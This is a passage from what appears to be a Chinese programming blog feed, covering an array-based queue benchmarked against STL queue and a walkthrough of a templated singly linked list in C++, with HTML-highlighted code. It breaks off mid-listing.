q.push_back(<span class="number">400</span>);</span><br><span class="line">    q.push_back(<span class="number">4000</span>);</span><br><span class="line">    q.push_back(<span class="number">40000</span>);</span><br><span class="line"></span><br><span class="line">    q.pop_front();</span><br><span class="line">    q.pop_front();</span><br><span class="line">    q.pop_front();</span><br><span class="line">    q.pop_front();</span><br><span class="line">    q.pop_front();</span><br><span class="line">    q.pop_front();</span><br><span class="line"></span><br><span class="line">    q.push_back(<span class="number">5</span>);</span><br><span class="line">    q.push_back(<span class="number">6</span>);</span><br><span class="line">    q.push_back(<span class="number">7</span>);</span><br><span class="line">    q.push_back(<span class="number">8</span>);</span><br><span class="line">    q.push_back(<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">    q.output();</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"size: "</span>&lt;&lt;q.size()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"front: "</span>&lt;&lt;q.Front()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"back: "</span>&lt;&lt;q.Back()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[6] 4000</span><br><span class="line">[7] 40000</span><br><span class="line">[8] 5</span><br><span class="line">[9] 6</span><br><span class="line">[0] 7</span><br><span class="line">[1] 8</span><br><span class="line">[2] 9</span><br><span class="line">size: 7</span><br><span class="line">front: 4000</span><br><span class="line">back: 9</span><br></pre></td></tr></table></figure>

<h3 id="STL-queue"><a href="#STL-queue" class="headerlink" title="STL queue"></a>STL queue</h3><p>将自己写的arrayQueue和STL queue分别测试，看看谁快些，这里我仅仅测试了先插入完成后再删除。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    arrayQueue&lt;<span class="keyword">int</span>&gt;q2;</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">100000000</span>;</span><br><span class="line">    CClock::start_timeclock();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        q2.push_back(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        q2.pop_front();</span><br><span class="line">    &#125;</span><br><span class="line">    q2.output();</span><br><span class="line">    CClock::stop_timeclock();</span><br><span class="line">    <span class="keyword">auto</span> t1=CClock::time_duration();</span><br><span class="line"></span><br><span class="line">    CClock::start_timeclock();</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt;q3;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        q3.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        q3.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    CClock::stop_timeclock();</span><br><span class="line">    <span class="keyword">auto</span> t2=CClock::time_duration();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"arrayQueue: "</span>&lt;&lt;t1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"queue: "</span>&lt;&lt;t2&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果，单位秒</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arrayQueue: 2.32446</span><br><span class="line">queue: 2.63278</span><br></pre></td></tr></table></figure>

<p>不知道该如何表达……<br>(⊙o⊙)…</p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>bye~</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-C++链表实现</title>
    <url>/linkedlist-cpp/</url>
    <content><![CDATA[<p>最近在研究《数据结构、算法与应用C++语言描述》，把一些自己的看法和代码实现写在这里，算是个记录吧，以免以后忘记。</p>
<a id="more"></a>


<h3 id="线性表——链表描述"><a href="#线性表——链表描述" class="headerlink" title="线性表——链表描述"></a>线性表——链表描述</h3><p>总所周知，数组中元素地址在内存中是连续分布的，而链表的元素在内存中的存储位置是随机的。其中比较简单的链表类型就是单向链表，这种类型的链表的每个节点只有一个链，且每个节点都连接下一个节点（除了最后一个节点:NULL用来标记链表的结束）。</p>
<p><img src="/uploads/images/data_structure/linkedlist_cpp/node.jpg" alt></p>
<p>为了用链表描述线性表，需要定义一个节点结构体，使用C++模板能够支持更多的类型</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">chainNode</span>&#123;</span></span><br><span class="line">    T data;</span><br><span class="line">    chainNode* next;</span><br><span class="line">    chainNode()&#123;&#125;</span><br><span class="line">    chainNode(<span class="keyword">const</span> T &amp;data)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;data=data;</span><br><span class="line">        <span class="keyword">this</span>-&gt;next=<span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    chainNode(<span class="keyword">const</span> T &amp;data,chainNode*next)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;data=data;</span><br><span class="line">        <span class="keyword">this</span>-&gt;next=next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="链表类LinkedList"><a href="#链表类LinkedList" class="headerlink" title="链表类LinkedList"></a>链表类LinkedList</h3><p>我们需要定义一个类，用于管理链表操作</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">LinkedList</span>&#123;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    chainNode&lt;T&gt;*m_Header;</span><br><span class="line">    <span class="keyword">int</span> m_size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    LinkedList();</span><br><span class="line">    LinkedList(<span class="keyword">const</span> T&amp;);</span><br><span class="line">    <span class="comment">// 拷贝构造函数</span></span><br><span class="line">    LinkedList(<span class="keyword">const</span> LinkedList&lt;T&gt;&amp;);</span><br><span class="line">    <span class="comment">// 移动构造函数</span></span><br><span class="line">    LinkedList(LinkedList&lt;T&gt;&amp;&amp;);</span><br><span class="line">    <span class="keyword">virtual</span> ~LinkedList();</span><br><span class="line">    <span class="comment">// 插入节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">const</span> T&amp;)</span></span>;</span><br><span class="line">    <span class="comment">// 在链表尾插入节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">append</span><span class="params">(<span class="keyword">const</span> T&amp;)</span></span>;</span><br><span class="line">    <span class="comment">// 删除指定索引的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eraseByIndex</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="comment">// 删除所有元素为T的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">(<span class="keyword">const</span> T&amp;)</span></span>;</span><br><span class="line">    <span class="comment">// 删除所有节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clearAll</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 返回首次出现的节点索引</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(<span class="keyword">const</span> T&amp;)</span></span>;</span><br><span class="line">    <span class="function">T &amp;<span class="title">get</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="function">chainNode&lt;T&gt;*<span class="title">getFirstchainNode</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">chainNode&lt;T&gt;*<span class="title">getLastchainNode</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 输出所有节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">outputLinkedList</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="插入节点"><a href="#插入节点" class="headerlink" title="插入节点"></a>插入节点</h3><p>链表的插入其实很简单，首先需要找到索引index的节点，然后在<strong>该节点之后或者之前</strong>插入新元素节点，那么？如何插入呢？其实就是通过 <code>chainNode* next</code> 指针将内存中的节点地址链接起来，<code>chainNode* next</code> 也只是一个变量标识符来标识内存中的地址罢了，因此我们可以通过替换next指针将需要插入的节点和已经存在的链表串起来，如下图所示</p>
<p><img src="/uploads/images/data_structure/linkedlist_cpp/insert_node.jpg" alt></p>
<p>为了说明，我们先来一个最简单的例子，在链表尾处插入节点</p>
<h4 id="append"><a href="#append" class="headerlink" title="append()"></a>append()</h4><p>代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:append(<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">    <span class="keyword">while</span> (pNode-&gt;next)&#123;</span><br><span class="line">        pNode=pNode-&gt;next;   </span><br><span class="line">    &#125;</span><br><span class="line">    pNode-&gt;next=<span class="keyword">new</span> chainNode&lt;T&gt;(data);</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要在尾部插入节点，那么需要单向遍历整个链表，注意 <code>while (pNode-&gt;next)</code> 不能是 <code>while (pNode)</code> ，因为我们需要用尾节点添加一个新节点，同时更新链表大小</p>
<p>注意：可能有人会有疑惑：pNode=pNode-&gt;next 会让m_Header 指向下一个节点啊？其实 <font color="red">chainNode<t>*pNode=m_Header;  只是将 m_Header 的地址值复制给pNode变量而已，虽然pNode会修改其地址值，但是它内存中的数据对象没有改变，改变的只是一个普通的指针变量</t></font> </p>
<h4 id="insert"><a href="#insert" class="headerlink" title="insert()"></a>insert()</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:insert(<span class="keyword">int</span> theIndex,<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    <span class="keyword">if</span>(theIndex&lt;<span class="number">0</span>||theIndex&gt;=m_size)<span class="keyword">return</span>;    </span><br><span class="line">    <span class="comment">// 新建头节点</span></span><br><span class="line">    <span class="keyword">if</span>(theIndex==<span class="number">0</span> &amp;&amp; m_Header==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        m_Header=<span class="keyword">new</span> chainNode&lt;T&gt;(data);</span><br><span class="line">        m_size++;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">        <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (pNode)&#123;</span><br><span class="line">            <span class="comment">// 在 theIndex之后 插入节点</span></span><br><span class="line">            <span class="comment">// 找到了要插入的索引</span></span><br><span class="line">            <span class="keyword">if</span>(index==theIndex)&#123;</span><br><span class="line">                <span class="comment">// 新节点</span></span><br><span class="line">                pNode-&gt;next=<span class="keyword">new</span> chainNode&lt;T&gt;(data,pNode-&gt;next);</span><br><span class="line">                <span class="comment">// 该语句等同于: 即替换next指针，使其衔接起来</span></span><br><span class="line">                <span class="comment">// auto p=new chainNode&lt;T&gt;(data);</span></span><br><span class="line">                <span class="comment">// p-&gt;next=pNode-&gt;next;</span></span><br><span class="line">                <span class="comment">// pNode-&gt;next=p;</span></span><br><span class="line">                m_size++;</span><br><span class="line">            &#125;</span><br><span class="line">            index++;</span><br><span class="line">            <span class="comment">// 指向下一个节点</span></span><br><span class="line">            pNode=pNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="输出链表节点"><a href="#输出链表节点" class="headerlink" title="输出链表节点"></a>输出链表节点</h3><p>在介绍删除之前，我们需要输出链表节点内容方便调试，这段代码很简单，基本都是while(pNode)循环的套路</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:outputLinkedList()&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;m_Header==<span class="literal">nullptr</span>)<span class="keyword">return</span>;</span><br><span class="line">    chainNode&lt;T&gt;*pNode=<span class="keyword">this</span>-&gt;m_Header;</span><br><span class="line">    <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (pNode)&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">"["</span>&lt;&lt;index&lt;&lt;<span class="string">"] =&gt; "</span>&lt;&lt;pNode-&gt;data&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        index++;</span><br><span class="line">        pNode=pNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h3><p>删除链表中的某个节点类似于插入节点，也是通过指针替换的手段，然后delete掉要删除的节点即可。不过有些地方需要注意。<br><img src="/uploads/images/data_structure/linkedlist_cpp/delete_node.jpg" alt></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:eraseByIndex(<span class="keyword">int</span> theIndex)&#123;</span><br><span class="line">    <span class="keyword">if</span>(theIndex&lt;<span class="number">0</span> || theIndex&gt;=m_size)<span class="keyword">return</span>;  </span><br><span class="line">    <span class="comment">// deletedNode 为待删除节点</span></span><br><span class="line">    chainNode&lt;T&gt;*deletedNode=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// 处理删除头节点特殊情况，因为单向链表头结点无前驱节点</span></span><br><span class="line">    <span class="keyword">if</span>(theIndex==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// 将 m_Header 标记为删除</span></span><br><span class="line">        deletedNode = m_Header;</span><br><span class="line">        <span class="comment">// 更新头节点</span></span><br><span class="line">        m_Header=m_Header-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 其他情况</span></span><br><span class="line">        chainNode&lt;T&gt;*pNodePre=m_Header;</span><br><span class="line">        <span class="comment">// 查找 待删除节点的前驱节点，其索引为theIndex-1</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; theIndex<span class="number">-1</span>; i++)&#123;</span><br><span class="line">            pNodePre=pNodePre-&gt;next;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 指针替换</span></span><br><span class="line">        deletedNode=pNodePre-&gt;next;</span><br><span class="line">        pNodePre-&gt;next=deletedNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 删除节点</span></span><br><span class="line">    <span class="keyword">delete</span> deletedNode;</span><br><span class="line">    deletedNode=<span class="literal">nullptr</span>;</span><br><span class="line">    m_size--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中要注意如果要删除索引为0的节点也就是头结点，那么只需要让头结点更新为原来的下一个节点，然后再delete要删除的节点，这种情况很特殊，因为<strong>单向链表头结点无前驱节点</strong>。其他情况需要一个前驱节点（也就是当前节点的上一个节点）来衔接整个链表。</p>
<p>再来看下面的代码，删除链表中所有数据为data的节点，同时还处理的头结点的特殊情况</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:erase(<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">    chainNode&lt;T&gt;*pNodePre;</span><br><span class="line">    <span class="keyword">while</span> (pNode)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pNode-&gt;data==data)&#123;</span><br><span class="line">            <span class="comment">// 处理删除头结点情况</span></span><br><span class="line">            <span class="keyword">if</span>(pNode==m_Header)&#123;</span><br><span class="line">                <span class="keyword">auto</span> next=m_Header-&gt;next;</span><br><span class="line">                <span class="keyword">delete</span> m_Header;</span><br><span class="line">                m_Header=next;</span><br><span class="line">                <span class="comment">// 并使其指向原来头结点的下一个节点</span></span><br><span class="line">                pNode=next;</span><br><span class="line">                m_size--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                pNodePre-&gt;next=pNode-&gt;next;</span><br><span class="line">                <span class="keyword">delete</span> pNode;</span><br><span class="line">                <span class="comment">// 这条语句能够继续删除链表中数据为data的节点</span></span><br><span class="line">                pNode=pNodePre;</span><br><span class="line">                m_size--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 保存前驱节点</span></span><br><span class="line">        pNodePre=pNode;</span><br><span class="line">        pNode=pNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="其他成员函数"><a href="#其他成员函数" class="headerlink" title="其他成员函数"></a>其他成员函数</h3><p>事实上，当真正了解的单向链表的插入删除的本质时，其他的链表类型也能理解。</p>
<p>单向链表是最基础的一种链表类型，当然还有其他的一些变种：循环列表、双向链表、双向循环链表、甚至是树结构（层次结构    ）也与链表密不可分。因此，必须要对链表十分熟悉！！！</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:empty()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;m_Header==<span class="literal">nullptr</span>&amp;&amp;<span class="keyword">this</span>-&gt;m_size&lt;=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:size()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;m_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:indexOf(<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">    <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (pNode&amp;&amp;pNode-&gt;data!=data)&#123;</span><br><span class="line">        index++;</span><br><span class="line">        pNode=pNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 到达链表尾pNode标识为nullptr，表示没有找到</span></span><br><span class="line">    <span class="keyword">if</span>(pNode==<span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> index;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">T</span> &amp;<span class="title">LinkedList</span>&lt;T&gt;:</span>:get(<span class="keyword">int</span> index)&#123;</span><br><span class="line">    <span class="keyword">if</span>(index&lt;<span class="number">0</span> || index&gt;=m_size)</span><br><span class="line">        <span class="keyword">throw</span> length_error(<span class="string">"the index is invalid!"</span>);</span><br><span class="line">    chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (pNode&amp;&amp;index!=(count++))&#123;</span><br><span class="line">        pNode=pNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pNode-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">chainNode</span>&lt;T&gt;* <span class="title">LinkedList</span>&lt;T&gt;:</span>:getFirstchainNode()&#123;</span><br><span class="line">    <span class="keyword">return</span> m_Header;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">chainNode</span>&lt;T&gt;* <span class="title">LinkedList</span>&lt;T&gt;:</span>:getLastchainNode()&#123;</span><br><span class="line">    <span class="keyword">auto</span> p=m_Header;</span><br><span class="line">    <span class="keyword">while</span> (p&amp;&amp;p-&gt;next)&#123;</span><br><span class="line">        p=p-&gt;next;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整代码:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">chainNode</span>&#123;</span></span><br><span class="line">    T data;</span><br><span class="line">    chainNode* next;</span><br><span class="line">    chainNode()&#123;&#125;</span><br><span class="line">    chainNode(<span class="keyword">const</span> T &amp;data)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;data=data;</span><br><span class="line">        <span class="keyword">this</span>-&gt;next=<span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    chainNode(<span class="keyword">const</span> T &amp;data,chainNode*next)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;data=data;</span><br><span class="line">        <span class="keyword">this</span>-&gt;next=next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">LinkedList</span>&#123;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    chainNode&lt;T&gt;*m_Header;</span><br><span class="line">    <span class="keyword">int</span> m_size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    LinkedList();</span><br><span class="line">    LinkedList(<span class="keyword">const</span> T&amp;);</span><br><span class="line">    <span class="comment">// 拷贝构造函数</span></span><br><span class="line">    LinkedList(<span class="keyword">const</span> LinkedList&lt;T&gt;&amp;);</span><br><span class="line">    <span class="comment">// 移动构造函数</span></span><br><span class="line">    LinkedList(LinkedList&lt;T&gt;&amp;&amp;);</span><br><span class="line">    <span class="keyword">virtual</span> ~LinkedList();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">const</span> T&amp;)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">append</span><span class="params">(<span class="keyword">const</span> T&amp;)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eraseByIndex</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="comment">// 删除所有元素为T的节点</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">(<span class="keyword">const</span> T&amp;)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">clearAll</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 返回首次出现的节点索引</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(<span class="keyword">const</span> T&amp;)</span></span>;</span><br><span class="line">    <span class="function">T &amp;<span class="title">get</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line">    <span class="function">chainNode&lt;T&gt;*<span class="title">getFirstchainNode</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">chainNode&lt;T&gt;*<span class="title">getLastchainNode</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">outputLinkedList</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">LinkedList</span>&lt;T&gt;:</span>:LinkedList()&#123;</span><br><span class="line">    m_Header=<span class="literal">nullptr</span>;</span><br><span class="line">    m_size=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">LinkedList</span>&lt;T&gt;:</span>:LinkedList(<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    m_Header=<span class="keyword">new</span> chainNode&lt;T&gt;(data);</span><br><span class="line">    m_size=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 拷贝构造函数-&gt;深拷贝</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">LinkedList</span>&lt;T&gt;:</span>:LinkedList(<span class="keyword">const</span> LinkedList&lt;T&gt;&amp;ll)&#123;</span><br><span class="line">    <span class="keyword">if</span>(ll.m_Header==<span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">throw</span> runtime_error(<span class="string">"The source object can not nullptr!"</span>);</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_size=ll.m_size;</span><br><span class="line">    <span class="comment">// 构建头节点</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;m_Header=<span class="keyword">new</span> chainNode&lt;T&gt;(ll.m_Header-&gt;data);</span><br><span class="line">    chainNode&lt;T&gt;*pNodeSource=ll.m_Header-&gt;next;</span><br><span class="line">    chainNode&lt;T&gt;*pNodeTarget=<span class="keyword">this</span>-&gt;m_Header;</span><br><span class="line">    <span class="comment">// 从源链表的头结点的下一个节点开始逐个复制</span></span><br><span class="line">    <span class="keyword">while</span> (pNodeSource)&#123;</span><br><span class="line">        pNodeTarget-&gt;next=<span class="keyword">new</span> chainNode&lt;T&gt;(pNodeSource-&gt;data);</span><br><span class="line">        pNodeSource=pNodeSource-&gt;next;</span><br><span class="line">        pNodeTarget=pNodeTarget-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    pNodeTarget-&gt;next=<span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移动构造函数-&gt;浅拷贝</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span 